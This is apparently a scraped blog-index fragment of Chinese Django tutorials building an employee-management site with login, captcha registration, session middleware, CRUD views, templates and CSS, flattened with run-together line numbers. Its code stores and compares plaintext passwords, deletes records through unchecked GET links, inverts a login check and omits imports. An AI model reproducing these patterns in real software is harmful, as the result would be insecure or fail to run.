django.shortcuts import render, redirectfrom work.models import User, Staffimport random, stringfrom captcha.image import ImageCaptchafrom django.core.paginator import Paginator# 主页面def emplist(request): return redirect(&quot;work:emplist_logic&quot;) # 存在session,返回员# 登陆页面def login(request): return render(request, &quot;work/login.html&quot;) # 密码错误.返回登陆页面重新登陆# 注册页面def regist(request): return render(request, &quot;work/regist.html&quot;)# 添加员工页面def addEmp(request): return render(request, &quot;work/addEmp.html&quot;)# 修改员工页面def updateEmp(request): # 填写获取的该员工信息 id = request.GET.get(&#x27;id&#x27;) staff = Staff.objects.get(pk=id) return render(request, &quot;work/updateEmp.html&quot;, &#123;&quot;staff&quot;: staff&#125;)# 登陆逻辑def login_logic(request): username = request.POST.get(&quot;name&quot;) userpwd = request.POST.get(&quot;pwd&quot;) res = User.objects.filter(username=username, userpwd=userpwd) if res: request.session[&#x27;is_login&#x27;] = True # 登陆正确设置及session会话 return redirect(&quot;work:emplist&quot;) # 重定向到员工页面 return redirect(&quot;work:login&quot;) # 密码错误,返回登陆页面重新登陆# 随机码def getCaptacha(request): image = ImageCaptcha() code = random.sample(string.ascii_lowercase + string.ascii_uppercase + string.digits, 4) random_code = &#x27;&#x27;.join(code) request.session[&#x27;code&#x27;] = random_code data = image.generate(random_code) return HttpResponse(data, &quot;image/png&quot;)# 注册逻辑def regist_logic(request): username = request.POST.get(&quot;username&quot;) name = request.POST.get(&quot;name&quot;) userpwd = request.POST.get(&quot;pwd&quot;) sex = request.POST.get(&quot;sex&quot;) # 获取输入的验证码 captcha = request.POST.get(&#x27;captcha&#x27;) code = request.session.get(&#x27;code&#x27;) if code.lower() == captcha.lower(): res = User.objects.filter(username=username) # 获取数据库是否拥有用户名 if res: return HttpResponse(&quot;用户已存在&quot;) with transaction.atomic(): User.objects.create(username=username, name=name, userpwd=userpwd, sex=sex) return redirect(&quot;work:login&quot;) else: return HttpResponse(&#x27;注册失败&#x27;)# 添加员工逻辑def addEmp_logic(request): # 判断是否存在session,不存在强制返回登陆界面 res = request.session.get(&#x27;is_login&#x27;) if res: return redirect(&quot;work:emplist_logic&quot;) # 存在session,返回员工页面 name = request.POST.get(&#x27;name&#x27;) salary = request.POST.get(&#x27;salary&#x27;) age = request.POST.get(&#x27;age&#x27;) # 获取上传的头像 pic = request.FILES.get(&#x27;head_pic&#x27;) ext = os.path.splitext(pic.name)[1] # 获取后缀 head_pic = str(uuid.uuid4()) + ext # 拼接后缀名 pic.name = head_pic with transaction.atomic(): Staff.objects.create(name=name, salary=salary, age=age, pic=pic) return redirect(&quot;work:emplist_logic&quot;)# 修改数据逻辑def updateEmp_logic(request): # 根据修改页面的该员工的id id = request.GET.get(&#x27;id&#x27;) print(id) staff = Staff.objects.get(pk=id) # 获取到提交的修改数据 name = request.POST.get(&#x27;name&#x27;) salary = request.POST.get(&#x27;salary&#x27;) age = request.POST.get(&#x27;age&#x27;) # 修改图片 pic = request.FILES.get(&#x27;head_pic&#x27;) ext = os.path.splitext(pic.name)[1] # 获取后缀 head_pic = str(uuid.uuid4()) + ext # 拼接后缀名 pic.name = head_pic # 进行员工的信息修改 with transaction.atomic(): staff.name = name staff.salary = salary staff.age = age staff.pic = pic staff.save() return redirect(&quot;work:emplist&quot;)# 删除员工def delete_logic(request): with transaction.atomic(): id = request.GET.get(&#x27;id&#x27;) staff = Staff.objects.filter(pk=id) staff.delete() return redirect(&#x27;work:emplist&#x27;)# 主页逻辑def emplist_logic(request): # 分页需要导包Paginator num =request.GET.get(&#x27;num&#x27;,1) paginator = Paginator(Staff.objects.all(), per_page=3) #每页显示3条数据 page = paginator.page(num) #构建页面对象 return render(request, &#x27;work/emplist.html&#x27;, &#123;&quot;page&quot;: page&#125;) MyMiddleware 中间件1234567891011121314151617181920212223242526272829303132333435# _*_coding:UTF-8 _*_from django.shortcuts import redirect, renderfrom django.utils.deprecation import MiddlewareMixinclass MyMiddleware(MiddlewareMixin): # 自定义的中间件 def __init__(self, get_response): # 初始化 super().__init__(get_response) print(&quot;中间件已经初始化完毕&quot;) # view处理请求前执行 def process_request(self, request): # 某一个view if &#x27;login&#x27; not in request.path: is_login = request.session.get(&#x27;is_login&#x27;) if is_login: pass elif &#x27;regist&#x27; in request.path: pass elif &quot;getCaptacha&quot; in request.path: pass else: return render(request,&#x27;work/login.html&#x27;) # 在process_request之后View之前执行 def process_view(self, request, view_func, view_args, view_kwargs): print(&quot;view:&quot;, request, view_func, view_args, view_kwargs) # view执行之后，响应之前执行 def process_response(self, request, response): print(&quot;response:&quot;, request, response) return response # 必须返回response # 如果View中抛出了异常 def process_exception(self, request, ex): # View中出现异常时执行 print(&quot;exception:&quot;, request, ex) models1pic = models.ImageField(upload_to=&#x27;pic&#x27;) emplist.html123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142&#123;% load static %&#125;&lt;!DOCTYPE html PUBLIC &quot;-//W3C//DTD HTML 4.01 Transitional//EN&quot; &quot;http://www.w3.org/TR/html4/loose.dtd&quot;&gt;&lt;html&gt;&lt;head&gt; &lt;title&gt;emplist&lt;/title&gt; &lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=UTF-8&quot;&gt; &lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;/static/work/css/style.css&quot;/&gt;&lt;/head&gt;&lt;body&gt;&lt;div id=&quot;wrap&quot;&gt; &lt;div id=&quot;top_content&quot;&gt; &lt;div id=&quot;header&quot;&gt; &lt;div id=&quot;rightheader&quot;&gt; &lt;p&gt; 2009/11/20 &lt;br/&gt; &lt;/p&gt; &lt;/div&gt; &lt;div id=&quot;topheader&quot;&gt; &lt;h1 id=&quot;title&quot;&gt; &lt;a href=&quot;#&quot;&gt;main&lt;/a&gt; &lt;/h1&gt; &lt;/div&gt; &lt;div id=&quot;navigation&quot;&gt; &lt;/div&gt; &lt;/div&gt; &lt;div id=&quot;content&quot;&gt; &lt;p id=&quot;whereami&quot;&gt; &lt;/p&gt; &lt;h1&gt; Welcome! &lt;/h1&gt; &lt;table class=&quot;table&quot;&gt; &lt;tr class=&quot;table_header&quot;&gt; &lt;td&gt; ID &lt;/td&gt; &lt;td&gt; Name &lt;/td&gt; &lt;td&gt; Salary &lt;/td&gt; &lt;td&gt; Age &lt;/td&gt; &lt;td&gt; head_pic &lt;/td&gt; &lt;td&gt; Operation &lt;/td&gt; &lt;/tr&gt; &#123;% for i in page.object_list %&#125; &#123;% if forloop.counter|divisibleby:2 %&#125; &lt;tr class=&quot;row1&quot; style=&quot;background-color: #ffffff&quot;&gt; &lt;td&gt; &#123;&#123; forloop.counter &#125;&#125; &lt;/td&gt; &lt;td&gt; &#123;&#123; i.name &#125;&#125; &lt;/td&gt; &lt;td&gt; &#123;&#123; i.salary &#125;&#125; &lt;/td&gt; &lt;td&gt; &#123;&#123; i.age &#125;&#125; &lt;/td&gt; &lt;td&gt; &lt;img src=&quot;&#123;% static i.pic.url %&#125;&quot; alt=&quot;图片加载失败&quot; height=&quot;70px&quot;&gt; &lt;/td&gt; &lt;td&gt; &lt;a href=&quot;&#123;% url &quot;work:delete_logic&quot; %&#125;?id=&#123;&#123; i.id &#125;&#125;&quot;&gt;delete emp&lt;/a&gt;&amp;nbsp;&lt;a href=&quot;&#123;% url &quot;work:updateemp&quot; %&#125;?id=&#123;&#123; i.id &#125;&#125;&quot;&gt;update emp&lt;/a&gt; &lt;/td&gt; &lt;/tr&gt; &#123;% else %&#125; &lt;tr class=&quot;row2&quot; style=&quot;background-color: #eeeeee&quot;&gt; &lt;td&gt; &#123;&#123; forloop.counter &#125;&#125; &lt;/td&gt; &lt;td&gt; &#123;&#123; i.name &#125;&#125; &lt;/td&gt; &lt;td&gt; &#123;&#123; i.salary &#125;&#125; &lt;/td&gt; &lt;td&gt; &#123;&#123; i.age &#125;&#125; &lt;/td&gt; &lt;td&gt; &lt;img src=&quot;&#123;% static i.pic.url %&#125;&quot; alt=&quot;图片加载失败&quot; height=&quot;70px&quot;&gt; &lt;/td&gt; &lt;td&gt; &lt;a href=&quot;&#123;% url &quot;work:delete_logic&quot; %&#125;?id=&#123;&#123; i.id &#125;&#125;&quot;&gt;delete emp&lt;/a&gt;&amp;nbsp;&lt;a href=&quot;&#123;% url &quot;work:updateemp&quot; %&#125;?id=&#123;&#123; i.id &#125;&#125;&quot;&gt;update emp&lt;/a&gt; &lt;/td&gt; &lt;/tr&gt; &#123;% endif %&#125; &#123;% endfor %&#125; &lt;/table&gt; &#123;% if page.has_previous %&#125; &lt;a href=&quot;&#123;% url &#x27;work:emplist_logic&#x27; %&#125;?num=&#123;&#123; page.previous_page_number &#125;&#125;&quot;&gt; 上一页&lt;/a&gt; &#123;% endif %&#125; &#123;% for foo in page.paginator.page_range %&#125; &lt;a href=&quot;&#123;% url &#x27;work:emplist_logic&#x27; %&#125;?num=&#123;&#123; foo &#125;&#125;&quot;&gt; &#123;% if foo == page.number %&#125; &lt;span class=&quot;b&quot;&gt;&#123;&#123; foo &#125;&#125;&lt;/span&gt; &#123;% else %&#125; &lt;span class=&quot;a&quot;&gt;&#123;&#123; foo &#125;&#125;&lt;/span&gt; &#123;% endif %&#125; &lt;/a&gt; &#123;% endfor %&#125; &#123;% if page.has_next %&#125; &lt;a href=&quot;&#123;% url &#x27;work:emplist_logic&#x27; %&#125;?num=&#123;&#123; page.next_page_number &#125;&#125;&quot;&gt; 下一页&lt;/a&gt; &#123;% endif %&#125; &#123;% if not page.paginator.num_pages == page.number %&#125; &lt;a href=&quot;&#123;% url &#x27;work:emplist_logic&#x27; %&#125;?num=&#123;&#123; page.paginator.num_pages &#125;&#125;&quot;&gt;尾页&lt;/a&gt; &#123;% endif %&#125; &lt;form action=&quot;&#123;% url &#x27;work:emplist_logic&#x27; %&#125;&quot; method=&quot;get&quot;&gt; 输入页号&lt;input type=&quot;text&quot; name=&quot;num&quot;&gt; &lt;input type=&quot;submit&quot; value=&quot;跳转&quot;&gt; &lt;p&gt; &lt;input type=&quot;button&quot; class=&quot;button&quot; value=&quot;Add Employee&quot; onclick=&quot;location=&#x27;&#123;% url &quot;work:addemp&quot; %&#125;&#x27;&quot;/&gt; &lt;/p&gt; &lt;/form&gt; &lt;/div&gt; &lt;/div&gt; &lt;div id=&quot;footer&quot;&gt; &lt;div id=&quot;footer_bg&quot;&gt; ABC@126.com &lt;/div&gt; &lt;/div&gt;&lt;/div&gt;&lt;/body&gt;&lt;/html&gt; regist.html123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103&lt;!DOCTYPE html PUBLIC &quot;-//W3C//DTD HTML 4.01 Transitional//EN&quot; &quot;http://www.w3.org/TR/html4/loose.dtd&quot;&gt;&lt;html&gt; &lt;head&gt; &lt;title&gt;regist&lt;/title&gt; &lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=UTF-8&quot;&gt; &lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;/static/work/css/style.css&quot; /&gt; &lt;script&gt; function f() &#123; var img = document.getElementById(&#x27;img1&#x27;) img.src = &quot;&#123;% url &#x27;work:getCaptacha&#x27; %&#125;?&quot;+new Date().getTime() &#125; &lt;/script&gt; &lt;/head&gt; &lt;body&gt; &lt;div id=&quot;wrap&quot;&gt; &lt;div id=&quot;top_content&quot;&gt; &lt;div id=&quot;header&quot;&gt; &lt;div id=&quot;rightheader&quot;&gt; &lt;p&gt; 2009/11/20 &lt;br /&gt; &lt;/p&gt; &lt;/div&gt; &lt;div id=&quot;topheader&quot;&gt; &lt;h1 id=&quot;title&quot;&gt; &lt;a href=&quot;#&quot;&gt;main&lt;/a&gt; &lt;/h1&gt; &lt;/div&gt; &lt;div id=&quot;navigation&quot;&gt; &lt;/div&gt; &lt;/div&gt; &lt;div id=&quot;content&quot;&gt; &lt;p id=&quot;whereami&quot;&gt; &lt;/p&gt; &lt;h1&gt; 注册 &lt;/h1&gt; &lt;form action=&quot;&#123;% url &quot;work:regist_logic&quot; %&#125;&quot; method=&quot;post&quot;&gt; &#123;% csrf_token %&#125; &lt;table cellpadding=&quot;0&quot; cellspacing=&quot;0&quot; border=&quot;0&quot; class=&quot;form_table&quot;&gt; &lt;tr&gt; &lt;td valign=&quot;middle&quot; align=&quot;right&quot;&gt; 用户名: &lt;/td&gt; &lt;td valign=&quot;middle&quot; align=&quot;left&quot;&gt; &lt;input type=&quot;text&quot; class=&quot;inputgri&quot; name=&quot;username&quot; /&gt; &lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td valign=&quot;middle&quot; align=&quot;right&quot;&gt; 真实姓名: &lt;/td&gt; &lt;td valign=&quot;middle&quot; align=&quot;left&quot;&gt; &lt;input type=&quot;text&quot; class=&quot;inputgri&quot; name=&quot;name&quot; /&gt; &lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td valign=&quot;middle&quot; align=&quot;right&quot;&gt; 密码: &lt;/td&gt; &lt;td valign=&quot;middle&quot; align=&quot;left&quot;&gt; &lt;input type=&quot;password&quot; class=&quot;inputgri&quot; name=&quot;pwd&quot; /&gt; &lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td valign=&quot;middle&quot; align=&quot;right&quot;&gt; 性别: &lt;/td&gt; &lt;td valign=&quot;middle&quot; align=&quot;left&quot;&gt; 男 &lt;input type=&quot;radio&quot; class=&quot;inputgri&quot; name=&quot;sex&quot; value=&quot;m&quot; checked=&quot;checked&quot;/&gt; 女 &lt;input type=&quot;radio&quot; class=&quot;inputgri&quot; name=&quot;sex&quot; value=&quot;f&quot;/&gt; &lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td valign=&quot;middle&quot; align=&quot;right&quot;&gt; 验证码: &lt;img id=&quot;img1&quot; src=&quot;&#123;% url &#x27;work:getCaptacha&#x27; %&#125;&quot; width=&quot;70px&quot;/&gt; &lt;a href=&quot;javascript:void(0)&quot; onclick=&quot;f()&quot;&gt;换一张&lt;/a&gt; &lt;/td&gt; &lt;td valign=&quot;middle&quot; align=&quot;left&quot;&gt; &lt;input type=&quot;text&quot; class=&quot;inputgri&quot; name=&quot;captcha&quot; /&gt; &lt;/td&gt; &lt;/tr&gt; &lt;/table&gt; &lt;p&gt; &lt;input type=&quot;submit&quot; class=&quot;button&quot; value=&quot;Submit &amp;raquo;&quot; /&gt; &lt;/p&gt; &lt;/form&gt; &lt;/div&gt; &lt;/div&gt; &lt;div id=&quot;footer&quot;&gt; &lt;div id=&quot;footer_bg&quot;&gt; ABC@126.com &lt;/div&gt; &lt;/div&gt; &lt;/div&gt; &lt;/body&gt;&lt;/html&gt; updateEmp.html123456789&lt;tr&gt; &lt;td valign=&quot;middle&quot; align=&quot;right&quot;&gt; head_pic: &lt;/td&gt; &lt;td valign=&quot;middle&quot; align=&quot;left&quot;&gt; &lt;img src=&quot;&#123;% static staff.pic.url%&#125;&quot; alt=&quot;图片加载失败&quot; height=&quot;70px&quot;&gt; &lt;input type=&quot;file&quot; name=&quot;head_pic&quot;&gt; &lt;/td&gt;&lt;/tr&gt;","categories":[],"tags":[{"name":"Django","slug":"Django","permalink":"http://example.com/tags/Django/"}]},{"title":"Django-实现简易员工操作","slug":"Django-实现简易员工操作","date":"2020-08-23T10:27:24.000Z","updated":"2022-04-08T14:29:40.234Z","comments":true,"path":"2020/08/23/Django-实现简易员工操作/","permalink":"http://example.com/2020/08/23/Django-%E5%AE%9E%E7%8E%B0%E7%AE%80%E6%98%93%E5%91%98%E5%B7%A5%E6%93%8D%E4%BD%9C/","excerpt":"Django实现用户登陆,注册,以及session会话强制登陆,以及对员工的信息的增加,删除,修改操作","text":"Django实现用户登陆,注册,以及session会话强制登陆,以及对员工的信息的增加,删除,修改操作 Django实现简易的员工操作Django实现用户登陆,注册,以及session会话强制登陆,以及对员工的信息的增加,删除,修改操作 结构 model模型创建APP,挂载APP,创建用户表和员工表 1234567891011121314from django.db import models# Create your models here.class User(models.Model): username = models.CharField(max_length=20) name =models.CharField(max_length=20,default=None,null=True) userpwd = models.CharField(max_length=20) sex = models.CharField(max_length=20)class Staff(models.Model): name = models.CharField(max_length=20) salary = models.IntegerField() age = models.IntegerField() 执行python manage.py makemigrations ,以及 python manage migrations views.py视图12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091929394959697from django.http import HttpResponsefrom django.shortcuts import render, redirectfrom work.models import User, Staff# 主页面def emplist(request): # 判断是否存在session,不存在强制返回登陆界面 res = request.session.get(&#x27;is_login&#x27;) if res: return redirect(&quot;work:emplist_logic&quot;) # 存在session,返回员工页面 return redirect(&#x27;work:login&#x27;) # 不存在session,强制返回为登陆页面# 登陆页面def login(request): # 判断密码是否正确,正确设置session为True username = request.POST.get(&#x27;name&#x27;) userpwd = request.POST.get(&#x27;pwd&#x27;) res = User.objects.filter(username=username, userpwd=userpwd) if res: request.session[&#x27;is_login&#x27;] = True # 密码正确,设置session return redirect(&quot;work:emplist&quot;) # 重定向到员工页面 else: return render(request, &quot;work/login.html&quot;) # 密码错误.返回登陆页面重新登陆# 注册页面def regist(request): return render(request, &quot;work/regist.html&quot;)# 添加员工页面def addEmp(request): return render(request, &quot;work/addEmp.html&quot;)# 修改员工页面def updateEmp(request): # 填写获取的该员工信息 id = request.GET.get(&#x27;id&#x27;) staff = Staff.objects.get(pk=id) return render(request, &quot;work/updateEmp.html&quot;, &#123;&quot;staff&quot;: staff&#125;)# 登陆逻辑def login_logic(request): username = request.POST.get(&quot;name&quot;) userpwd = request.POST.get(&quot;pwd&quot;) res = User.objects.filter(username=username, userpwd=userpwd) if res: request.session[&#x27;is_login&#x27;] = True # 登陆正确设置及session会话 return redirect(&quot;work:emplist&quot;) # 重定向到员工页面 return render(request, &quot;work/login.html&quot;) # 密码错误,返回登陆页面重新登陆# 注册逻辑def regist_logic(request): username = request.POST.get(&quot;username&quot;) name = request.POST.get(&quot;name&quot;) userpwd = request.POST.get(&quot;pwd&quot;) sex = request.POST.get(&quot;sex&quot;) res = User.objects.filter(username=username) # 获取数据库是否拥有用户名 if res: return HttpResponse(&quot;用户已存在&quot;) User.objects.create(username=username, name=name, userpwd=userpwd, sex=sex) return redirect(&quot;work:login&quot;)# 添加员工逻辑def addEmp_logic(request): name = request.POST.get(&#x27;name&#x27;) salary = request.POST.get(&#x27;salary&#x27;) age = request.POST.get(&#x27;age&#x27;) Staff.objects.create(name=name, salary=salary, age=age) return redirect(&quot;work:emplist_logic&quot;)# 修改数据逻辑def updateEmp_logic(request): # 根据修改页面的该员工的id id = request.GET.get(&#x27;id&#x27;) print(id) staff = Staff.objects.get(pk=id) # 获取到提交的修改数据 name = request.POST.get(&#x27;name&#x27;) salary = request.POST.get(&#x27;salary&#x27;) age = request.POST.get(&#x27;age&#x27;) # 进行员工的信息修改 staff.name = name staff.salary = salary staff.age = age staff.save() return redirect(&quot;work:emplist&quot;)# 删除员工def delete_logic(request): id = request.GET.get(&#x27;id&#x27;) staff = Staff.objects.filter(pk=id) staff.delete() return redirect(&#x27;work:emplist&#x27;)# 主页逻辑def emplist_logic(request): staff = Staff.objects.all() print(len(staff)) return render(request, &#x27;work/emplist.html&#x27;, &#123;&quot;staff&quot;: staff&#125;) urls.py12345678910111213141516171819# _*_coding:UTF-8 _*_from django.urls import path, from work import viewsapp_name = &quot;work&quot; #app名称urlpatterns = [ path(&#x27;emplist/&#x27;, views.emplist,name=&quot;emplist&quot;), path(&#x27;login/&#x27;, views.login,name=&quot;login&quot;), path(&#x27;regist/&#x27;, views.regist,name=&quot;regist&quot;), path(&#x27;login_logic/&#x27;, views.login_logic,name=&quot;login_logic&quot;), path(&#x27;regist_logic/&#x27;, views.regist_logic,name=&quot;regist_logic&quot;), path(&#x27;addemp/&#x27;, views.addEmp,name=&quot;addemp&quot;), path(&#x27;updateemp/&#x27;, views.updateEmp,name=&quot;updateemp&quot;), path(&#x27;addemp_logic/&#x27;, views.addEmp_logic,name=&quot;addemp_logic&quot;), path(&#x27;updateemp_logic/&#x27;, views.updateEmp_logic,name=&quot;updateemp_logic&quot;), path(&#x27;delete_logic/&#x27;, views.delete_logic,name=&quot;delete_logic&quot;), path(&#x27;emplist_logic/&#x27;, views.emplist_logic,name=&quot;emplist_logic&quot;),] static静态样式css123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281282283284285286287288289290291292293294295296297298299300301302303304305306307308309310311312313314315316317318319320321322323324325326327328329330331332333334335336337338339340341342343344345346347348349350351352353354355356357358359360361362363364365366367368369370371372373374375376377378379380381382383384385386387388389390391392393394395396397398399400401402403404405406407408409410411412413414415416417418419420421422423424425426427428429430431432433434435436437438439440body&#123; margin: 0; font-size: 62.5%; font-family: Verdana, Arial, Helvetica, sans-serif; padding: 15px 0; background: #eeeeee;&#125;#wrap &#123; width: 820px; margin: 0 auto; background: url(../img/all/bg.gif) top repeat-y #FFFFFF;&#125;#top_content &#123; padding: 0 10px;&#125;#topheader &#123; padding: 25px 15px 15px 15px; margin: 0 auto 0 auto; background: url(../img/all/top_left.gif) top left repeat-x #85C329;&#125;#rightheader &#123; float: right; width: 375px; height: 40px; color: #FFFFFF; text-align: right;&#125;#rightheader p &#123; padding: 35px 15px 0 0; margin: 0; text-align: right;&#125;#rightheader p span &#123; font-weight: bold;&#125;#rightheader a:link, #rightheader a:visited &#123; color: #FFFFFF; text-decoration: underline;&#125;#title &#123; padding: 0; margin: 0; font-size: 2.5em; color: #FFFFFF;&#125;#title span &#123; font-size: 0.5em; font-style: italic;&#125;#title a:link, #title a:visited &#123; color: #FFFFFF; text-decoration: none;&#125;#title a:hover &#123; color: #E1F3C7;&#125;#navigation &#123; background: #74A8F5; border-top: 1px solid #ffffff; height: 25px; clear: both&#125;#navigation ul &#123; padding: 0; margin: 0; list-style: none; font-size: 1.1em; height: 25px;&#125;#navigation ul li &#123; display: inline;&#125;#navigation ul li a &#123; color: #FFFFFF; display: block; text-decoration: none; float: left; line-height: 25px; padding: 0 16px; border-right: 1px solid #ffffff;&#125;#navigation ul li a:hover &#123; background: #5494F3;&#125;#content &#123; padding: 0 15px; margin: 0 auto 0 auto; background: url(../img/all/content_bg.gif) repeat-x left top #ffffff; color: #666666;&#125;#content p#whereami &#123; padding: 20px 0 15px 0; margin: 0;&#125;#whereami a:link, #whereami a:visited &#123; color: #73A822; text-decoration: underline;&#125;#content h1, #content h2,#content h3, #content h4 , #content h5 &#123; color: #74A8F5;&#125;#content h1 &#123; font-family: &quot;Trebuchet MS&quot;, Arial, Helvetica; padding: 0; margin: 0 0 15px 0; font-size: 2em;&#125;#content h2 &#123; font-family: &quot;Trebuchet MS&quot;, Arial, Helvetica; padding: 0; margin: 0 0 15px 0; font-size: 1.5em;&#125;#top_body, #content_body &#123; padding: 0 25px;&#125;#footer &#123; background: url(../img/all/footer.gif) no-repeat center bottom ; color: #FFFFFF; padding: 0 10px 13px 10px;&#125;#footer p &#123; padding: 0; margin: 0;&#125;#footer p a:link, #footer p a:visited &#123; color: #FFFFFF; font-style: italic; text-decoration: none;&#125;#footer #footer_bg &#123; background: url(../img/all/footer_bg.gif) repeat-x left bottom #85C329; padding: 15px 15px 25px 15px; border-top: 1px solid #7BB425;&#125;#footer #design &#123; display: block; width: 150px; height: 30px; float: right; line-height: 20px; padding: 0 5px; text-align: right; color: #E1F3C7;&#125;#footer #design a &#123; color: #FFFFFF; text-decoration: underline;&#125;.table &#123; margin-bottom: 15px; width: 100%; border-collapse: collapse;&#125;.table_header td &#123; background: url(../img/all/tableheader-bg.gif) no-repeat left top; padding: 5px 10px; color: rgb(70,122,167); border-top: 1px solid #CBD6DE; border-bottom: 1px solid #ADBECB; font-size: 1.1em; font-weight: bold;&#125;.table_header td a:link, .table_header td a:visited &#123; text-decoration: underline; color: rgb(70,122,167);&#125;.table_header td a:hover &#123; text-decoration: underline; color: #73A822;&#125;.table_header td &#123; border: 1px solid #CBD6DE;&#125;.row1 td, .row2 td, .row_hover td, .paging_row td &#123; padding: 5px 10px; color: #666666; border: 1px solid #CBD6DE;&#125;.row1 td &#123; background: #ffffff;&#125;.row2 td &#123; background: #eeeeee;&#125;.row_hover td &#123; background: #FBFACE; color: #000000;&#125;.hidden &#123; display: none;&#125;.little &#123; font-size: 10px;&#125;.clear &#123; clear: both;&#125;.img_left &#123; float: left; padding: 1px; border: 1px solid #cccccc; margin: 0 10px 10px 0; width: 110px; height:150px;&#125;/* #content ul basic style for unordered lists------------------------------------------------*/#content ul &#123; font-size: 1.1em; line-height: 1.8em; margin: 0 0 15px 0; padding: 0; list-style-type: none;&#125;/* #content p paragraphs-----------------------------*/#content p &#123; font-size: 1.2em; margin: 0; padding: 0 0 15px 0;&#125;/* #content p a links in paragraphs------------------------------------*/#content p a:link, #content p a:visited,.table a:link, .table a:visited,.link a &#123; color: #73A822; text-decoration: none;&#125;#content p a:hover, .table a:hover, .link a:hover &#123; text-decoration: underline;&#125;/* #content ul.green (73A822)--------------------------------*/#content ul.green li &#123; padding: 0 0 0 20px; margin: 0; background: url(../img/all/bullet_green.gif) no-repeat 1px 3px; font-size: 1.1em;&#125;#content ul.green li a:link, #content ul.green li a:visited &#123; color: #73A822; text-decoration: none;&#125;#content ul.green li a:hover &#123; color: #73A822; text-decoration: underline;&#125;/* #content ul.black (73A822)--------------------------------*/#content ul.black li &#123; padding: 0 0 0 20px; margin: 0; background: url(../img/all/bullet_grey.gif) no-repeat 1px 3px; font-size: 1.1em;&#125;#content ul.black li a:link, #content ul.black li a:visited &#123; color: #666666; text-decoration: none;&#125;#content ul.black li a:hover &#123; color: #999999; text-decoration: underline;&#125;/* #content ol--------------------------------*/#content ol &#123; padding: 0 0 0 25px; margin: 0 0 15px 0; line-height: 1.8em;&#125;#content ol li &#123; font-size: 1.1em;&#125;#content ol li a:link, #content ol li a:visited &#123; color: #73A822; text-decoration: none;&#125;#content ol li a:hover &#123; color: #73A822; text-decoration: underline;&#125;/* #content p.paging ---------------------------------*/#content p.paging &#123;padding: 5px;border: 1px solid #CBD6DE;text-align: center;margin-bottom: 15px;background: #eeeeee;&#125;/* .small_input smaller text in inputs/combos-----------------------------------------------*/.small_input &#123; font-size: 10px;&#125;/* .form_table style for table used in forms---------------------------------------------*/.form_table &#123; margin-bottom: 15px; font-size: 1.1em;&#125;.form_table p &#123; margin: 0; padding: 0;&#125;.form_table td &#123; padding: 5px 10px;&#125;/* .checkbox_nomargins clear all margins from a checkbox---------------------------------------------------------*/.checkbox_nomargins &#123; /*margin:0;width:13px;height:13px;overflow:hidden; font-size: 10px;*/ margin: 0; padding: 0;&#125;/* .button some buttons style - inspired from wordpress------------------------------*/input.button &#123; margin: 0; padding: 2px; border: 3px double #999999; border-left-color: #ccc; border-top-color: #ccc; background: url(../img/all/button.gif) repeat-x left top; font-size: 11px; font-family: Verdana, Arial, Helvetica, sans-serif;&#125;/* form style for forms-------------------------*/form &#123; padding: 0; margin: 0;&#125;/* input.inputgri - some style for inputs--------------------------------------------*/input.inputgri, select.inputgri, textarea.inputgri &#123; background: #eeeeee; font-size: 14px; border: 1px solid #cccccc; padding: 3px;&#125;input.inputgri:focus, select.inputgri:focus , textarea.inputgri:focus &#123; background: #ffffff; border: 1px solid #686868;&#125;/* .notice - messages to user--------------------------------*/.notice &#123; background: #CAEA99; border: 1px solid #70A522; padding: 15px 15px 15px 15px; margin-bottom: 15px; font-size: 1.2em; color: #333333;&#125;.notice_error &#123; background: #FEDCDA; border: 1px solid #CE090E; padding: 15px 15px 15px 15px; margin-bottom: 15px; font-size: 1.2em; color: #333333;&#125;#notice a &#123; color: #333333; text-decoration: underline;&#125;/* Other links ----------------*/.other_links &#123; background: #eeeeee; border-top: 1px solid #cccccc; padding: 5px; margin: 0 0 15px 0;&#125;#content .other_links h2 &#123; color: #999999; padding: 0 0 0 3px; margin: 0;&#125;#content .other_links ul &#123; padding: 0; margin: 0;&#125;#content .other_links ul li &#123; padding: 0 0 0 20px; background: url(../img/all/bullet_grey.gif) no-repeat left center;&#125;#content .other_links a, #content .other_links a:visited &#123; color: #999999; text-decoration: underline;&#125;#content .other_links a:hover &#123; color: #666666;&#125;/* code */code &#123; font-size: 1.2em; color: #73A822;&#125; HTMLemplist.html123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108&lt;!DOCTYPE html PUBLIC &quot;-//W3C//DTD HTML 4.01 Transitional//EN&quot; &quot;http://www.w3.org/TR/html4/loose.dtd&quot;&gt;&lt;html&gt; &lt;head&gt; &lt;title&gt;emplist&lt;/title&gt; &lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=UTF-8&quot;&gt; &lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;/static/work/css/style.css&quot; /&gt; &lt;/head&gt; &lt;body&gt; &lt;div id=&quot;wrap&quot;&gt; &lt;div id=&quot;top_content&quot;&gt; &lt;div id=&quot;header&quot;&gt; &lt;div id=&quot;rightheader&quot;&gt; &lt;p&gt; 2009/11/20 &lt;br /&gt; &lt;/p&gt; &lt;/div&gt; &lt;div 